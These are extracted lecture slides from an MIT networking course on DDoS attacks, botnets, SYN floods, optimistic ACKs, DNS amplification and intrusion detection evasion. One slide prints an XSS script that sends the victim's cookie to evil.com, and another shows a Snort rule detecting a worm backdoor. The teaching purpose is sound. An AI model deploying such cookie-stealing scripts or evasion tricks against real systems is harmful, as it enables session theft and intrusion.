  
 
 6.033 Spring 2018
Lecture #23 
•Combating network adversaries
•DDoS attacks
•Intrusion Detection
1
6.033 | spring 2018 | Katrina LaCurts   
 Last time 
request
principal 
(identifies client on 
server)server
resource guard
attacker’s goal
observe or tamper with packets 
2
6.033 | spring 2018 | Katrina LaCurts       
     
 This time 
server
resource guardrequest
principal 
(identifies client on 
server)
attacker’s goal 
prevent legitimate access to an Internet resource
method: DDoS attacks 
congest the service enough to make it unavailable 
3
6.033 | spring 2018 | Katrina LaCurts   
     
    
 botnets: large collections of compromised
machines controlled by an attacker.
make DDoS attacks much easier to mount 
4
6.033 | spring 2018 | Katrina LaCurts 
        
 <script> document.location = 'http://evil.com/ blah.cgi?cookie=' + document.cookie ; </script> 
XSS: if this script is executed on a victim’s 
machine, the attacker will get the victim’s cookie
5
6.033 | spring 2018 | Katrina LaCurts   
     
    
 botnets: large collections of compromised
machines controlled by an attacker.
make DDoS attacks much easier to mount 
C&C server 
example command: 
dos <IP> 
… 
compromised machines 
(~100,000 of them) 
6
6.033 | spring 2018 | Katrina LaCurts  
source: http://en.wikipedia.org/wiki/File:Botnet.svg 
© Tom-b from Wikipedia. All rights reserved. This content is excluded from our Creative Commons 
license. For more information, see https://ocw.mit.edu/help/faq-fair-use . 6.033 | spring 2018 | Katrina LaCurts 
7   
 network intrusion detection systems (NIDS): 
attempt to detect network attacks so that users
can then prevent them (detection is the first 
step to prevention)
8
6.033 | spring 2018 | Katrina LaCurts alert tcp $EXTERNAL_NET any - > $HOME_NET 7597 
(msg:"MALWARE- BACKDOOR QAZ Worm Client Login access";
flow:to_server,established; content:"qazwsx.hsq"; 
metadata:ruleset community; reference:mcafee,98775; classtype:misc- activity; sid:108; rev:11;) 
9
6.033 | spring 2018 | Katrina LaCurts 
    
 
 network intrusion detection systems (NIDS): 
attempt to detect network attacks so that users
can then prevent them (detection is the first 
step to prevention) 
10
6.033 | spring 2018 | Katrina LaCurts     
 for each packet: 
search packet for “root” 
problem: string might be split across packets
11
6.033 | spring 2018 | Katrina LaCurts    
 stream = [] 
for each packet: 
add packet data to stream 
search stream for “root” 
problem: packets might arrive out of order 
12
6.033 | spring 2018 | Katrina LaCurts      
  
 stream = [] 
for each packet: 
get sequence number 
add to stream in the correct order 
search stream for “root” 
problem: this is more difficult that it looks on the slide, 
and requires keeping a lot of state
problem 2: it doesn’t even work
13
6.033 | spring 2018 | Katrina LaCurts 
 attacker receiver5 hops 15 hops NIDS 
seq=1: [ r ]seq=1: [ r ] or [ n ] 
[ r ] TTL=23 seq=1
[ n ] TTL=17 seq=1  
X 
received by NIDS,
not by receiver,
because of TTL 
14
6.033  | spring 2018 attacker receiver5 hops 15 hops NIDS 
seq=1: [ r ] or [ n ] seq=1: [ r ] 
seq=2: [ o ] or [ i ] seq=2: [ o ] 
[ r ] TTL=23 seq=1
[ n ] TTL=17 seq=1
X [ o ] TTL=21 seq=2
[ i ] TTL=15 seq=2
X
15
6.033  | spring 2018 attacker receiver5 hops 15 hops NIDS 
seq=1: [ r ] or [ n ] seq=1: [ r ] 
seq=2: [ o ] or [ i ] seq=2: [ o ] 
seq=3: [ o ] seq=3: [ o ] 
[ r ] TTL=23 seq=1
[ n ] TTL=17 seq=1  
X [ o ] TTL=21 seq=2
[ i ] TTL=15 seq=2  
X [ o ] TTL=20 seq=3  
16
6.033  | spring 2018 15 hops 5 hops attacker NIDS 
seq=1: [ r ] or [ n ] 
seq=2: [ o ] or [ i ] 
seq=3: [ o ] 
seq=4: [ c ] or [ t ] receiver 
seq=1: [ r ] 
seq=2: [ o ] 
seq=3: [ o ] 
seq=4: [ t ] 
[ r ] TTL=23 seq=1
[ n ] TTL=17 seq=1
X [ o ] TTL=21 seq=2
[ i ] TTL=15 seq=2
X [ o ] TTL=20 seq=3
[ c ] TTL=19 seq=4
X [ t ] TTL=27 seq=4
17
6.033  | spring 2018  
 additional challenge: 
some DDoS attacks mimic legitimate traffic
18
6.033 | spring 2018 | Katrina LaCurts GET largeFile.zip 
!
victim’s
webserver
19
6.033 | spring 2018 | Katrina LaCurts GET largeFile.zip 
DO bigQuery 
!
victim’s
webserver
20
6.033 | spring 2018 | Katrina LaCurts GET largeFile.zip 
DO bigQuery 
!
victim’s
webserver
21
6.033 | spring 2018 | Katrina LaCurts GET largeFile.zip 
DO bigQuery 
!
victim’s
webserver
22
6.033 | spring 2018 | Katrina LaCurtsSYN 
SYN-ACK
ACK TCP handshake 
store state 
connected! 
23
6.033  | spring 2018 SYN 
SYN-ACK
!store state 
24
6.033  | spring 2018 !SYN 
SYN store state 
25
6.033  | spring 2018 !SYN 
SYN store state 
SYN 
26
6.033  | spring 2018 !SYN 
SYN store state 
SYN 
SYN 
27
6.033  | spring 2018 !SYN 
SYN store state 
SYN 
SYN 
SYN 
28
6.033  | spring 2018 !SYN 
SYN store state 
SYN 
SYNSYNSYN 
SYN 
SYN 
29
6.033  | spring 2018 Normal ACKs 
seq=1 
seq=2
seq=3 
seq=4
seq=5
seq=6
seq=7 ack=1 
ack=2 
ack=3 
30
6.033  | spring 2018 !“Optimistic” ACKs
seq=1 ack=1 
31
6.033  | spring 2018 !“Optimistic” ACKs
seq=1 ack=1 
seq=2
seq=3 ack=2 
ack=3 
32
6.033  | spring 2018 !“Optimistic” ACKs
seq=1 
seq=2
seq=3 
seq=4
seq=5
seq=6
seq=7 ack=1 
ack=2 
ack=3 
33
6.033  | spring 2018 !“Optimistic” ACKs
seq=1 
seq=2
seq=3 
seq=4
seq=5
seq=6
seq=7 ack=1 
ack=2 
ack=3 
34
6.033  | spring 2018    
!“Optimistic” ACKs
seq=1 ack=1 
seq=2
seq=3 ack=2 
ack=3 
seq=4
seq=5
seq=6
seq=7 
victim will quickly saturate its own
links, in some sense DoSing itself 
35
6.033  | spring 2018    
 
 DNS request: src=1.2.3.4 
DNS nameservers 
(preferably DNSSEC -
enabled) …
DNS response: dst=1.2.3.4 
DDoS traffic doesn’t even 
come from attacker -
!
owned machines! victim’s IP: 
1.2.3.4 
36
6.033 | spring 2018 | Katrina LaCurts   
 attackers can also mount attacks by 
controlling routers 
© �ox �edia, �nc. All rights reserved. This content is excluded from our Creative Commons license. For more 
information, see https://ocw.mit.edu/help/faq-fair-use. 
37
6.033 | spring 2018 | Katrina LaCurts  
      
  
   
  
     
      
 
  
     
 • DDoS attacks prevent legitimate access to Internet 
services. Secure channels won’t help us here. Botnets 
make DDoS attacks very practical to mount. 
• DDoS attacks are difficult to prevent because they are 
difficult to detect. Signature- matching and anomaly -
detection help, but have their own challenges, and are 
sometimes evadable. Moreover, DDoS traffic can mimic 
legitimate traffic. 
• Network attacks are particularly devastating when parts of 
the network infrastructure are attacked (e.g., DDoSing 
the DNS root zone, making fake BGP announcements). 
38
6.033 | spring 2018 | Katrina LaCurts  
  MIT OpenCourseWare 
https://ocw.mit.edu 
�.�����ompute����stem����i�ee�i��
Spring 201� 
For information about citing these materials or our Terms of Use, visit: https://ocw.mit.edu/terms. 
39